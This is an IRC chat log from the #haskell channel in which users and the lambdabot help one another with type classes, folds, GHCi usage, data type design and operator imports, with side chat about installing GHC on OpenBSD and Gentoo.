12:35:37 <lambdabot> shapr is in #haskell, #scannedinavian, ##logic and #haskell-blah. I don't know when shapr last spoke.
12:35:48 <sjanssen> @ask shapr do you use xemacs with xmonad?
12:35:49 <lambdabot> Consider it noted.
12:36:43 <roconnor> damn, I'm out of vla.
12:37:47 <oerjan> @go vla
12:37:52 <lambdabot> http://www.vla.nrao.edu/
12:37:59 * CosmicRay sees the light.
12:38:20 <roconnor> http://nl.wikipedia.org/wiki/Vla
12:39:01 <roconnor> http://en.wikipedia.org/wiki/Vla
12:39:48 <twanvl> CosmicRay: An alternative might be to use two classes:  class FooClassA a where { myf2 :: a -> a } ; class FooClassA a => FooClass a b where { myf1 :: a -> b }
12:44:47 * oerjan suddenly gets the strange idea of marxist type classes
12:45:38 <Saizan> oerjan: such as?
12:45:39 <sorear> @go Type classes with functional dependancies
12:45:41 <lambdabot> http://citeseer.ist.psu.edu/jones00type.html
12:45:41 <lambdabot> Title: Type Classes with Functional Dependencies - Jones (ResearchIndex)
12:45:46 <sorear> 2000
12:46:03 <oerjan> i didn't say it was a coherent idea :D
12:46:34 <CosmicRay> so why does Data.Foldable not use MPTCs?  Do be more compatible with haskell98?
12:46:48 <CosmicRay> or perhaps because it existed before ByteString and nobody contemplated something like ByteString?
12:47:36 <Saizan> ?docs Data.Foldable
12:47:36 <lambdabot> Data.Foldable not available
12:47:41 <Saizan> ?docs
12:47:41 <lambdabot> http://haskell.org/ghc/docs/latest/html/libraries/index.html
12:47:54 <CosmicRay> Data.Traversable has the same issue
12:47:56 <CosmicRay> Data.Monoid does not
12:47:57 <sjanssen> CosmicRay: it's probably to integrate with Functor, Monad, etc.
12:48:18 <sjanssen> CosmicRay: it's also a bit more convenient to program with
12:49:34 <CosmicRay> and yet, to someone that just wants to use foldl for as many types as possible, less convenient.
12:49:45 <sjanssen> yes
12:49:59 <CosmicRay> ok, so I shall write my own Foldable class.
12:50:05 <CosmicRay> and Traversable, I guess.
12:50:20 <sjanssen> CosmicRay: double check that edison doesn't have what you need
12:50:36 <oerjan> Traversable is slightly more problematic
12:51:16 <oerjan> because it actually creates a new structure with possibly a new element type
12:51:46 <oerjan> or do i remember wrong, hm
12:51:47 <shapr> @users #haskell
12:51:47 <lambdabot> Maximum users seen in #haskell: 402, currently: 391 (97.3%), active: 26 (6.6%)
12:51:47 <CosmicRay> unfortunately edison appears to have the same problem
12:51:59 <CosmicRay> class (Functor s, MonadPlus s) => Sequence s where
12:52:11 <sjanssen> IIRC, edison uses fundeps over constructor classes
12:52:24 <shapr> Do ATs handle MPTCs?
12:52:24 <lambdabot> shapr: You have 1 new message. '/msg lambdabot @messages' to read it.
12:52:31 <sjanssen> oh, except for the Sequence class :(.  I remember now
12:52:36 <CosmicRay> hah
12:52:43 <CosmicRay> except for the specific class I'm after.
12:53:22 <sjanssen> I asked the maintainer about it once, he said he just hasn't gotten around to switching over
12:56:28 <togi> evenin'
12:56:49 <hpaste>  togi pasted "(no title)" at http://hpaste.org/2614
12:57:22 <togi> why doesn't stringsToProfile compile correctly?
12:57:47 <sjanssen> togi: paste the error message please
12:58:14 <hpaste>  togi pasted "Error message" at http://hpaste.org/2615
12:58:39 <Cale> matrixMul wants two values of type [[Double]] here
12:58:51 <Cale> but m is a [[Int]]
12:58:57 <reffie> the types are wrong
12:59:06 <shapr> I can't get the darcs repo version of cabal-install to work, what am I doing wrong?
12:59:07 <togi> ah
12:59:25 <mauke> (\x -> foo bar x) can be shortened to (foo bar)
12:59:41 <shapr> oh
12:59:56 <hpaste>  Cale annotated "(no title)" with "fixed" at http://hpaste.org/2614#a1
13:00:21 <shapr> There's a bug in the hxt 7.3 package, it doesn't have a LICENCE file.
13:00:28 <Cale> or yeah, you could write  map fromIntegral . numberOfInList "abcd"
13:00:55 <Cale> another possibility is to move the generalisation into numberOfInList itself
13:04:55 * shapr sends a bug report
13:05:13 <togi> thanks alot, got it working now ^^
13:05:29 <shapr> Someone needs to setup a script that installs all the hackage packages with cabal-install, and reports any bugs.
13:05:41 <mauke> a smoker
13:05:51 <shapr> yeah
13:06:05 <shapr> It would help if the authors tried that first, of course :-)
13:06:39 <monochrom> Authors proving their modules correct but not testing them? :)
13:07:03 <shapr> If people want to actually use that code, would be nice if it works.
13:07:18 <sjanssen> a missing LICENCE causes an installation failure?
13:08:12 <user317> does anyone know how scanl is implemented?
13:08:18 <sorear> @src scanl
13:08:18 <lambdabot> scanl f q ls = q : case ls of
13:08:18 <lambdabot>     []   -> []
13:08:18 <lambdabot>     x:xs -> scanl f (f q x) xs
13:08:28 <CosmicRay> So the arg that Foldable wants is of kind * -> *.  Is there a way I can "Split out" these two so that I can make Foldable a an instance of my MTPC foldable?
13:08:56 <sjanssen> CosmicRay: yes, you can use an overlapping instance to do that
13:09:08 <mauke> instance (Foldable f) => Foldable' (f a) a where ...
13:09:14 <sjanssen> instance Foldable c => MyFoldable (c a) a
13:09:20 <sorear> s/overlapping/\& and undecidable/
13:10:13 <CosmicRay> ah sure enough, that did it.  I was trying to split it out on the left of the =>.  excellent.
13:12:03 <gpi5> @evaluate
13:12:03 <lambdabot> Unknown command, try @list
13:12:15 <gpi5> @src evaluate
13:12:15 <lambdabot> evaluate a = IO $ \s -> case a `seq` () of () -> (# s, a #)
13:12:23 <mauke> heh
13:12:27 <mauke> IO guts!
13:12:34 <sjanssen> sorear: is that really undecidable?  The context is smaller than the instance head
13:13:01 <sorear> mmh, good point
13:13:36 <Cale> gpi5: It's effectively primitive.
13:14:06 <sorear> @ty GHC.IOBase.IO -- look at all the hashes!
13:14:08 <lambdabot> forall a. (GHC.Prim.State# GHC.Prim.RealWorld -> (# GHC.Prim.State# GHC.Prim.RealWorld, a #)) -> IO a
13:14:18 <user317> @src foldM
13:14:18 <lambdabot> foldM _ a []     = return a
13:14:19 <lambdabot> foldM f a (x:xs) = f a x >>= \fax -> foldM f fax xs
13:14:20 <shapr> atomb: Hiya!
13:14:35 <shapr> atomb: Hey, is your binding released?
13:14:36 <atomb> shapr: Hi!
13:14:43 * shapr waits impatiently!
13:15:01 <atomb> shapr: Not quite yet. Waiting for a couple of people to ok it.
13:15:05 <shapr> aww
13:15:07 <shapr> I can barely wait!
13:15:11 <Nafai> binding of what?
13:15:22 <shapr> Nafai: Probably shouldn't say till it is released.
13:15:25 <shapr> I signed an NDA!
13:15:33 <Nafai> Oh :(
13:15:41 <sorear> How does atomb know it's even a binding?
13:15:51 * shapr tries to think of how many NDAs he's signed for various Haskell companies...
13:16:03 <atomb> We wrote alternate implementations of the same thing.
13:16:11 <Nafai> When you can, can you say, "Hey, you know that one thing I mentioned but couldn't say..."
13:16:22 <shapr> But atomb's implementation was better.
13:16:23 <atomb> :)
13:16:26 <shapr> So I want to use and contribute to his.
13:17:08 <shapr> Yay, I installed Cabal 1.2 !
13:17:16 <shapr> And upgraded cabal-install also.
13:17:36 <atomb> Does 1.2 have exciting new features?
13:17:56 <shapr> http://www.haskell.org/cabal/release/rc/changelog
13:18:11 <shapr> Configurations are especially nice.
13:19:25 <atomb> Highlighted source in haddock also seems nice.
13:22:52 <user317> @src scanl
13:22:52 <lambdabot> scanl f q ls = q : case ls of
13:22:52 <lambdabot>     []   -> []
13:22:52 <lambdabot>     x:xs -> scanl f (f q x) xs
13:23:37 <Cale> > scanl (\x y -> concat ["(f ",x," ",y,")"]) "z" ["1","2","3"]
13:23:42 <lambdabot>  ["z","(f z 1)","(f (f z 1) 2)","(f (f (f z 1) 2) 3)"]
13:24:17 <Cale> > scanl (+) 0 [1,20,300,4000]
13:24:18 <vincenz_> > sqrt x = y where x = y*y
13:24:18 <lambdabot>  [0,1,21,321,4321]
13:24:18 <lambdabot>  Parse error
13:24:23 <vincenz_> > let sqrt x = y where x = y*y in sqrt 2
13:24:24 <lambdabot>   Not in scope: `y'
13:24:29 <vincenz_> blegh, scoping rules
13:24:31 <vincenz_> :P
13:24:36 <Cale> vincenz_: heh
13:24:43 <mauke> vincenz_: that's not the same x
13:24:49 <vincenz_> mauke: it's a lame joke
13:24:58 <mauke> I have something similar
13:25:13 <mauke> it uses a State monad where the state runs backwards in time
13:25:13 <Cale> mauke: see this thread: http://programming.reddit.com/info/2mx9o/comments/c2mxl1
13:25:14 <lambdabot> Title: WTF: "function mySqrt(x) return x*x; end" (reddit.com)
13:25:25 <vincenz_> http://programming.reddit.com/info/2mx9o/comments/c2mxv3
13:25:26 <lambdabot> Title: WTF: "function mySqrt(x) return x*x; end" (reddit.com)
13:26:14 <mauke> sqrt y = do { x <- get; put $ (x + y / x) / 2; return x }
13:26:17 <vincenz_> and people thought I Was serious to begin with..
13:26:46 <mauke> 'x <- get' retrieves the square root from the future, then put sends the same value pack into the past
13:26:54 <mauke> er, back into
13:27:21 <user317> hmm, i cant figure out how to write a scanlM
13:28:24 <jatqceer> Hi, all.  I'm thinking of making a data type like Data {list :: [Double], total :: Double}.  I want the total to be there so that if a function acting on this ever need the total will not need to calculate it again.  But I'm not sure how to indicate whether the total has been calculated or not.
13:28:25 <EvilTerran> mauke, would this work with MonadFix? or would it <<loop>>?
13:28:36 <mauke> it would loop
13:28:44 <EvilTerran> meh. i thought so.
13:28:47 <mauke> normal numbers are inherently strict
13:28:54 <mauke> i.e. you can't compute half of a number
13:28:55 <Cale> jatqceer: total :: Maybe Double ?
13:29:02 <koeien_> jatqceer, use Maybe
13:29:26 <EvilTerran> jatqceer, if you write Data { list = xs, total = sum xs }, it'll only work out the total the first time you need it anyway
13:29:30 <EvilTerran> because of laziness
13:29:38 <mauke> why not use total :: Double and recalc... what EvilTerran said
13:29:40 <Cale> That's quite true.
13:29:46 <EvilTerran> mauke, :D
13:29:54 <koeien_> better idea indeed
13:30:26 <jatqceer> ahh, EvilTerran's idea is great
13:30:40 <jatqceer> i never thought of that
13:30:43 <jatqceer> thanks
13:31:12 <user317> ah, i got it
13:37:15 <Cale> @paste
13:37:15 <lambdabot> Haskell pastebin: http://hpaste.org/new
13:38:19 <hpaste>  Cale pasted "scanlM" at http://hpaste.org/2616
13:38:46 <Cale> user317: you can compare with that and see if we came up with the same generalisation :)
13:40:28 <roconnor> > fix bitSize
13:40:33 <lambdabot>  32
13:42:01 <shapr> Has anyone tried Cabal 1.2 on MacOS X with "hs-source-dirs: ." it's breaking for sbp on #swhack
13:45:44 * araujo just made a new himerge release!
13:49:02 <dons> dcoutts: my new laptop is a dual core amd64 :)
13:49:25 <erg0t> dons: turion?
13:49:28 <malsyned> what's the syntax to perform an IO action and store its result in a variable at the GHCi prompt?
13:49:37 <EvilTerran> x <- doFoo
13:49:42 <malsyned> EvilTerran: thanks
13:49:49 <dons> erg0t: core 2 in a thinkpad x61
13:49:58 <EvilTerran> lines typed at the GHCi prompt are like those in a do{} block
13:50:19 <EvilTerran> except things that aren't :: IO <something> get wrapped in print (...)
13:50:25 <erg0t> ah you mean amd64 for the arch but is an intel
13:50:34 <dons> yeah
13:50:47 <shachaf> dons: OpenBSD on a Thinkpad? That doesn't sound good.
13:50:53 <EvilTerran> this means you can also mask existing definitions with ghci> let ... or ghci> x <- foo
13:50:56 <shachaf> dons: Does the hardware work properly?
13:50:59 <dons> sure. i've been running openbsd on thinkpads for the past 5 years
13:51:06 <shachaf> Hmm.
13:51:10 <malsyned> EvilTerran: is there a way to do that without having it print the contents of the variable right after?
13:51:12 * EvilTerran tried getting PC-BSD working on a thinkpad without success
13:51:12 <dons> thinkpads work very well with openbsd : many of the main bsd devs have thinkpads
13:51:34 <dons> one issue is the newer wireless devices, but otherwise, generally flawless
13:51:46 <dons> i'll write up an faq about this
13:52:04 <EvilTerran> malsyned, not that i know of, but there may be a setting somewhere
13:52:44 <sorear> dons: GHC doesn't support openbsd/amd64 IIRC
13:52:55 <sorear> or maybe I have open and free backward
13:53:20 <dons> sorear: openbsd is supported (i did the port)
13:53:27 <ddarius> There is a setting.
13:53:38 <koeien_> ghc 6.6 is in the next OpenBSD-ports ?
13:53:45 <dons> yep
13:53:51 <koeien_> that's cool
13:54:03 <jatqceer> dons: this encourages me to install openbsd, now
13:54:08 <dons> heh
13:54:14 <sorear> koeien_: i'd recommend *not* using any version of GHC in a source-based package manager...
13:54:34 <dons> it provides binaries too, sorear :)
13:54:46 <koeien_> i mainly use binary packages, if at all possible
13:55:01 <dons> sorear: ftp://ftp.usa.openbsd.org/pub/OpenBSD/snapshots/packages/i386/ghc-6.6.1p0.tgz
13:55:05 <jatqceer> sorear: it works quite well, flawless I mean, in gentoo's portage
13:55:14 <dons> pkg_add that.
13:55:28 <sorear> jatqceer: asides from the fact that it takes six hours to compile?
13:55:36 <dons> or if you prefer, ftp://ftp.usa.openbsd.org/pub/OpenBSD/snapshots/packages/amd64/ghc-6.6.1p0.tgz
13:56:27 <jatqceer> sorear: usually I don't know.  It compiles while I'm sleeping
13:56:56 <piggybox> sorear: it took me 2 and half hours to compile ghc 6.6 on a 2G cpu, but you can choose to install binary version in gentoo as well.
13:57:13 <sorear> okay, as long as your sleep schedule is that convienient
13:57:19 <sorear> piggybox: 13:53 < sorear> koeien_: i'd recommend *not* using any version of GHC in a source-based package manager...
13:58:14 <sorear> piggybox: I was not talking about portage, or any other system.  I was speaking in general about pure-source package managers.  No need to leap to portage's defense, since if it provides binaries, I obviously wasn't talking about it.
13:58:49 <shachaf> sorear: Portage cheats, in this case; there's a ghc-bin package that pretends to be a source package but really installs a binary.
13:58:54 <shachaf> sorear: (I think.)
13:59:20 <dons> i recommend using a source-based build of ghc, as a way to test your hardware for defects
13:59:46 <jatqceer> shachaf: that's not the case, afaik, -bin is for bootstraping
14:00:16 <glen_quagmire> @index Quadratic
14:00:16 <lambdabot> bzzt
14:00:21 <jatqceer> dons: i tested, and it seems my 5 year-old laptop still free of defects
14:00:58 <dons> cool :)
14:01:26 <shachaf> jatqceer: Oh.
14:01:34 <glen_quagmire> i bought a refurbished laptop 2 weeks ago and 'w' key and left mouse button doesn't work already
14:01:38 <shachaf> jatqceer: But you can install it directly if you want to?
14:01:56 <piggybox> jatqceer: turn on the 'binary' USE for ghc, not ghc-bin
14:02:51 <jatqceer> shachaf: sure.
14:03:01 <shachaf> OK, never mind.
14:03:02 <jatqceer> piggybox: yeah, if you do that
14:03:09 * shachaf isn't really a Gentoo expert.
14:08:38 <glen_quagmire> how do I read in floating point numbers from stdin?
14:08:49 <glen_quagmire> getLine and convert?
14:08:53 <Heffalump> @type readLine
14:08:55 <lambdabot> Not in scope: `readLine'
14:09:04 <oerjan> @type readLn
14:09:06 <lambdabot> forall a. (Read a) => IO a
14:11:31 * ddarius has no idea whea readLn is named the way it is.
14:12:14 <EvilTerran> for the same reason putStrLn is named like that, i guess
14:12:19 * oerjan recalls Pascal uses the same name
14:12:24 <glen_quagmire> > putStr "Enter a: "; a <- readLn
14:12:24 <lambdabot>  Parse error
14:12:39 <ddarius> @hoogle Line
14:12:39 <lambdabot> Text.ParserCombinators.Parsec.Line :: type Line
14:12:39 <lambdabot> Distribution.PackageDescription.LineNo :: type LineNo
14:12:39 <lambdabot> System.IO.LineBuffering :: BufferMode
14:12:46 <glguy> glen_quagmire: ; only works in do notation
14:12:55 <EvilTerran> glen_quagmire, you need a "do", and regardless, lambdabot doesn't do IO
14:13:05 <glguy> it does report the type, however
14:13:12 <glguy> > putStrLn ""
14:13:14 <lambdabot>  <IO ()>
14:13:29 <gpi5> I'd like to declare something like : data GnType = GnType (S | U) Integer
14:13:49 <glguy> data SorU = S | U
14:13:50 <gpi5> Do I need to declare a subtype for S | U ??
14:13:56 <EvilTerran> data GnType = GnType (Either S U) Integer?
14:14:00 <EvilTerran> @src Either
14:14:00 <lambdabot> Source not found. Just what do you think you're doing Dave?
14:14:01 <augustss_> gpi5: yes
14:14:16 <EvilTerran> data Either a b = Left a | Right b
14:14:24 <ddarius> Bool
14:14:25 <augustss_> gpi5: or use Either
14:14:30 <gpi5> Either or a subtype ?
14:14:40 <oerjan> data GnType = S Integer | U Integer is also possible
14:14:42 <EvilTerran> Either's just another datatype
14:14:52 <augustss_> gpi5: there are many ways
14:15:01 <gpi5> Ok, thanks.
14:15:04 <glguy> it depends on what you are trying to accomplish
14:15:11 <EvilTerran> well, it'd be data GnType = GnTypeS S Integer | GnTypeU U Integer, i guess
14:15:22 <shachaf> GnType Bool Integer might also work?
14:15:38 <EvilTerran> sorry, are S and U constructors or types?
14:15:47 <shachaf> EvilTerran: Constructors, I think.
14:15:53 <shachaf> EvilTerran: So Either also wouldn't work.
14:15:59 <gpi5> Yes, with Bool it is better..
14:16:03 <EvilTerran> (data U = ...; data S = ..., or data ... = U | S?)
14:16:12 * shachaf isn't sure Bool is the right solution, though.
14:16:19 <EvilTerran> if they're constructors, Bool would work
14:16:36 <EvilTerran> but if your type with those constructors provides meaning itself, it'd be better to use that.
14:17:52 <EvilTerran> by which i mean, S and U may have semantic meaning that you haven't explained, that would be lost if you switched to Bool
14:18:33 <gpi5> A number may be either signed or unsigned, so I guess a boolean is fine.
14:19:34 <EvilTerran> data GnType = GnType { gnIsSigned :: Bool, gnValue :: Integer } would be nicely self-documenting
14:20:02 <EvilTerran> (and you can still write GnType <a bool> <an integer> if you want)
14:21:03 <gpi5> Well, GnType is just the type, the Integer is the length. What are the brakets in GnType {...} ?
14:21:16 <EvilTerran> that's a record type definition
14:21:52 <glen_quagmire> :i Any
14:22:26 <EvilTerran> as i wrote it, it'd be the same as the lines "data GnType = GnType Bool Integer; gnIsSigned (GnType s _) = s; gnValue (GnType _ v) = v"
14:22:33 <glen_quagmire> when I have to return (Float, Float), what should I return when any float will do? (Float, Float) represents 2 roots of quadratic equation
14:22:59 <quicksilver> real or complex roots?
14:23:06 <quicksilver> real, obviously
14:23:07 <EvilTerran> except you can also write "GnType { gnIsSigned = s, gnValue = v }" instead of "GnType s v"
14:23:22 <glen_quagmire> quicksilver: i'll ignore complex case. it'll just return NaN in case of complex
14:23:34 <EvilTerran> can you return Maybe (Float, Float)?
14:23:35 <quicksilver> I'd return a data Root = TwoRoots Double Double | OneRoot Double | NoRoots
14:23:50 <koeien_> data Root = Zero | One Float | Two Float Float
14:23:51 <kpreid> @pl (a,b)->(b,a)
14:23:51 <lambdabot> (line 1, column 6):
14:23:51 <lambdabot> unexpected ">" or "-"
14:23:51 <lambdabot> expecting variable, "(", operator or end of input
14:24:07 <quicksilver> if you're happy to represent the repeated root as (x,x)
14:24:11 <EvilTerran> if you wanted to distinguish the one-root case, i'd return a Maybe (Float, Maybe Float))
14:24:14 <kpreid> Is there a simple way to define (a,b) -> (b,a)?
14:24:18 <quicksilver> then just Maybe (Double,Double) is fine
14:24:23 <koeien_> (\ (a,b) -> (b, a))
14:24:28 <kpreid> @pl \(a,b)->(b,a)
14:24:28 <lambdabot> uncurry (flip (,))
14:24:38 <quicksilver> (snd &&& fst)
14:24:39 <EvilTerran> kpreid, second *** first, or lambdabot's suggestion
14:24:40 <kpreid> heh, I tried to give pl a type
14:24:41 <glen_quagmire> oh thanks.
14:24:49 <EvilTerran> snd &&& fst, rather
14:25:05 <quicksilver> but I'd personally always use (\(a,b) -> (b,a))
14:25:08 <kpreid> I think I'll go with the lambda for this purpose; it's clear
14:25:10 <quicksilver> much clearer imo
14:25:44 <EvilTerran> there should probably either be a swap :: (a,b) -> (b,a) in the Prelude, or at least in Data.Tuple
14:26:33 <EvilTerran> s/either//
14:26:37 <DRMacIver> quicksilver: Except that it should be \~(a, b) -> (b, a)
14:27:16 <EvilTerran> ...is there ever a good reason for a lambda to not match lazily, given that there's no fallthrough?
14:28:35 <kpreid> Would anything break if a data type with only one constructor (e.g. (,)) had no bottom (and undefined :: (a,b) == (undefined,undefined))?
14:28:54 <sorear> kpreid: no.
14:29:13 <EvilTerran> surely that'd change some bottom semantics?
14:29:18 <sorear> kpreid: other than Haskell's semantics, but that can be fixed by renaming the language
14:29:24 <kpreid> And given that, wouldn't (a, (b, c)) have the same bottoms as (a, b, c)?
14:29:30 <sorear> kpreid: pre-release versions of Miranda worked like this
14:29:37 <sorear> it would.
14:29:52 <esteban2> this is the bible of haskell :)
14:30:18 <augustss> kpreid: nothing would break, in fact some things would unbreak
14:30:40 <kpreid> Hm.
14:30:54 <augustss> kpreid: but I like it the way it is
14:30:54 <monochrom> hehe
14:31:18 <kpreid> I can see that someone might be surprised by their lambda/case patterns changing behavior when a second constructor is added.
14:31:38 <augustss> kpreid: yes, that's one problem
14:31:39 <thetallguy> Can someone enlighten me on using operators from a module that I've imported qualified?
14:31:44 <sorear> yeah, that's why Miranda abandoned it
14:31:47 <sorear> thetallguy: M.<|
14:31:58 <kpreid> 1 Prelude.+ 2
14:32:04 <sorear> > 1 Prelude.+ 2
14:32:05 <lambdabot>  3
14:32:05 <thetallguy> Not working for me
14:32:14 <kpreid> thetallguy: show us your import
14:32:28 <kpreid> also, you might like "import qualified Foo as F"
14:32:34 <kpreid> (or other short alias)
14:33:33 <thetallguy> Oh wait, yes it is.
14:33:44 <thetallguy> What wasn't working was my renaming
14:34:29 <thetallguy> First I tried    foo = x << y where (<<) = M.(<<)
14:34:45 <vincenz_> psykotic: ping
14:34:49 <thetallguy> changing that to (M.<<) fixed the problem.
14:34:51 <thetallguy> THanks.
14:35:29 <oerjan> you can also import selected operators unqualified
14:36:19 <oerjan> import M ((<<))
14:36:40 <thetallguy> oerjan: thanks, I had thought about that, but wanted a more localized solution
14:37:02 <esteban2> > show 1
14:37:04 <lambdabot>  "1"
14:37:36 <hpaste>  glen_quagmire pasted "Somehow, I don't see "Enter a:" first" at http://hpaste.org/2617
14:37:53 <esteban2> I was going to argue with my teacher about the function show.. he had told me that i didn't have to use the show function to "show" something.. that i just had to return the value... but "show" is to convert from int to string :P
14:37:58 <sorear> glen_quagmire: read about buffering
14:38:09 <glen_quagmire> thanks
14:38:13 <vincenz_> preferably double-buffering
14:38:24 <esteban2> > toUpper "a"
14:38:25 <lambdabot>  Couldn't match expected type `Char' against inferred type `[Char]'
14:38:27 <oerjan> :t hFlush
14:38:29 <lambdabot> Not in scope: `hFlush'
14:38:31 <esteban2> > toUpper 'a'
14:38:32 <lambdabot>  'A'
14:38:38 <esteban2> > toLower 'a'
14:38:39 <lambdabot>  'a'
14:38:40 <oerjan> :t hflush
14:38:41 <esteban2> > toLower 'A'
14:38:42 <lambdabot> Not in scope: `hflush'
14:38:43 <lambdabot>  'a'
14:38:48 <oerjan> @hoogle flush
14:38:49 <lambdabot> GHC.ConsoleHandler.flushConsole :: Handle -> IO ()
14:38:49 <lambdabot> System.Win32.File.flushFileBuffers :: HANDLE -> IO ()
14:38:49 <lambdabot> IO.hFlush :: Handle -> IO ()
14:38:53 <esteban2> > toLower 'A':toUpper 'b'
14:38:54 <lambdabot>  Couldn't match expected type `[Char]' against inferred type `Char'
14:38:59 <esteban2> > toLower 'A':toUpper 'b':[]
14:39:00 <lambdabot>  "aB"
14:39:38 <esteban2> > (.) (*3) (mod 2) 3
14:39:39 <lambdabot>  6
14:40:02 <esteban2> @src unfoldl
14:40:03 <lambdabot> Source not found. I feel much better now.
14:40:09 <esteban2> lol...
14:40:12 <esteban2> @src foldl
14:40:12 <lambdabot> foldl f z xs = lgo z xs
14:40:12 <lambdabot>     where lgo z []     =  z
14:40:12 <lambdabot>           lgo z (x:xs) = lgo (f z x) xs
14:40:15 <esteban2> @src foldr
14:40:15 <lambdabot> foldr k z xs = go xs
14:40:15 <lambdabot>     where go []     = z
14:40:15 <lambdabot>           go (y:ys) = y `k` go ys
14:41:09 <esteban2> > foldl (*3) 2 [2,3,4]
14:41:10 <lambdabot>      Occurs check: cannot construct the infinite type: a = b -> a
14:41:10 <lambdabot>     Probabl...
14:41:26 <esteban2> > foldl (*) 2 [2,3,4]
14:41:27 <lambdabot>  48
14:41:45 <esteban2> > foldl (*) 2 [(*3),(*2),(*4)]
14:41:45 <lambdabot>   add an instance declaration for (Num (a -> a))
14:41:49 <esteban2> > foldl (*3) 2 [(*3),(*2),(*4)]
14:41:50 <lambdabot>      Occurs check: cannot construct the infinite type: a = b -> a
14:41:50 <lambdabot>     Probabl...
14:42:32 <fnord126> It would be cool/nice if lambdabot could load up hpaste functions so we could play with them. :)
14:42:36 <EvilTerran> the function to foldl needs two parameters
14:42:52 <oerjan> > foldl (flip ($)) 2 [(*3),(*2),(*4)]
14:42:54 <lambdabot>  48
14:43:23 <esteban2> EvilTerran: is this " func (f:fs) x = (.) f func (fs x) xs" correct??
14:43:32 <esteban2> i want to try to emulate the foldl function
14:43:49 <EvilTerran> that's an... interesting function
14:44:03 <EvilTerran> ?type \(f:fs) x -> (.) f func (fs x) x
14:44:04 <lambdabot> Not in scope: `func'
14:44:17 <esteban2> func is a function i made
14:44:18 <EvilTerran> ?type let func (f:fs) x = (.) f func (fs x) x in func
14:44:20 <lambdabot>     Couldn't match expected type `t1 -> [(t1 -> t) -> c]'
14:44:20 <lambdabot>            against inferred type `[(t1 -> t) -> c]'
14:44:35 <EvilTerran> it's not foldl, anyway. foldl doesn't require the list to be a list of functions
14:44:43 <oerjan> esteban2: you seem to have switched the list and function
14:44:54 <koeien> i don't think that that is possible? you apply fs to x, where fs must be a list
14:45:07 <esteban2> i want to go throgh the list of functions recursively and apply each of them to one element
14:45:18 <koeien> esteban, do you want "map" ?
14:45:22 <esteban2> not sure
14:45:28 <koeien> @src map
14:45:29 <lambdabot> map _ []     = []
14:45:29 <lambdabot> map f (x:xs) = f x : map f xs
14:45:45 <esteban2> i just want to be able to give a function a list of functions and a variable, and apply all of those functions to the element
14:45:47 <sorear> > map ($ 12) [negate, succ, (*2)]
14:45:49 <lambdabot>  [-12,13,24]
14:45:58 <Toxaris> esteban2: so you have a list of functions f1 f2 f3 ... fn and an element x and want to compute f1 (f2 (f3 (...(fn x))))?
14:46:00 <sorear> > foldr (.) id [negate, succ, (*2)] 12
14:46:01 <lambdabot>  -25
14:46:05 <esteban2> yes, Toxaris
14:46:11 <esteban2> but without foldr
14:46:17 <sorear> esteban2: why without foldr?
14:46:23 <esteban2> using composition and recursion, would it work?
14:46:29 <koeien> yeah sure
14:46:32 <sorear> of course
14:46:35 <esteban2> because then i would need to write the source of foldl
14:46:38 <Toxaris> esteban2: so   func = foldr (.) id   is the obvious choice :)
14:46:41 <sorear> foldr is *defined* using recursion
14:46:43 <esteban2> i know theres another way witthout using foldl
14:46:55 <sorear> foldl = evil
14:47:09 <esteban2> @src foldl
14:47:09 <lambdabot> foldl f z xs = lgo z xs
14:47:09 <lambdabot>     where lgo z []     =  z
14:47:09 <lambdabot>           lgo z (x:xs) = lgo (f z x) xs
14:47:13 <Toxaris> esteban2: but you can either (1) define your own foldr if you are not allowed to use the predefined or (2) write func using explicit recursion
14:47:24 <esteban2> that function is beyond of what i know
14:47:28 <EvilTerran> foldl f e [] = e; foldl f e (x:xs) = foldl f (f e x) xs
14:47:32 <fnord126> foldr (:) [] [1,2,3] --map
14:47:33 <EvilTerran> is that easier?
14:47:33 <koeien> func [] e = e ; func (f:fx) e = f (func fx e)
14:47:54 <esteban2> koala_man: i did something similar
14:47:59 <esteban2> but im not sure if its correct
14:48:01 <kpreid> @pl \f (a,b) -> (f a,f b)
14:48:01 <lambdabot> (`ap` snd) . (. fst) . (flip =<< (((.) . (,)) .))
14:48:07 <kpreid> egad
14:48:10 <EvilTerran> \(O.o)/
14:48:33 <oerjan> esteban2: apart from the xs at the end your version seems correct (but you need a line for [] as well)
14:48:34 <esteban2> func[(int->int)]->int->int , func (f:fs) a = (.) f func fs a
14:48:34 <EvilTerran> > join (***) (+1) (2,3)
14:48:36 <lambdabot>  (3,4)
14:48:42 <esteban2> oerjan.. well i did that too
14:48:56 <EvilTerran> kpreid, "join (***)" look better?
14:49:06 <kpreid> Why, yes.
14:49:14 <esteban2> oerjan: in that case, when the list is all evaluated, how is f composed with [] ?
14:49:19 <EvilTerran> you'll need to import Control.Monad (join), tho
14:49:25 <EvilTerran> @src join
14:49:26 <lambdabot> join x =  x >>= id
14:49:31 <EvilTerran> @src (->) (>>=)
14:49:32 <lambdabot> f >>= k = \ r -> k (f r) r
14:49:42 <kpreid> Well, for the purpose I was already intending to import Control.Arrow, so...
14:49:55 <EvilTerran> @hoogle join
14:49:55 <lambdabot> Monad.join :: Monad a => a (a b) -> a b
14:49:55 <lambdabot> Control.Monad.join :: Monad m => m (m a) -> m a
14:49:55 <lambdabot> Data.PackedString.joinPS :: PackedString -> [PackedString] -> PackedString
14:50:04 <EvilTerran> meh. thought there might be a joinA or somesuch.
14:50:27 <oerjan> esteban2: func [] x = x
14:50:38 <Toxaris> esteban2: what should be the result of applying no functions to x?
14:50:44 <esteban2> s*it..
14:50:50 <esteban2> so func [] x [] is wron
14:50:57 <esteban2> the function returns a string
14:51:08 <koeien> i don't think your version is correct
14:51:21 <koeien> :t let func (f:fs) a = (.) f func fs a in func
14:51:23 <lambdabot> forall t t1. [(t -> t1) -> t -> t1] -> t -> t1
14:51:26 <esteban2> this is the prototype: editor::string->[(string->string)]->string
14:51:58 <Toxaris> esteban2: and what should (editor "test" []) return?
14:51:58 <esteban2> when the list is all evaluated, then func (x:xs) [] = []
14:52:02 <oerjan> esteban2: it's naturally polymorphic, so String could be replaced by anything
14:52:07 <shapr> Does Thomas Schilling show up on #haskell?
14:52:12 <esteban2> editor recevies a list of functions that do stuff
14:52:28 <esteban2> oerjan: i know, but in this case all the functions i made were string->string
14:52:37 <Toxaris> string is anything, since it is not String :)
14:52:46 <esteban2> string of ints?
14:53:04 <esteban2> well actually what i did was String
14:53:17 <esteban2> sorry for the typos :)
14:54:25 <luqui> @djinn (Either c d, e) -> (Either (c,e) d)
14:54:25 <lambdabot> f (a, b) =
14:54:25 <lambdabot>     case a of
14:54:25 <lambdabot>     Left c -> Left (c, b)
14:54:25 <lambdabot>     Right d -> Right d
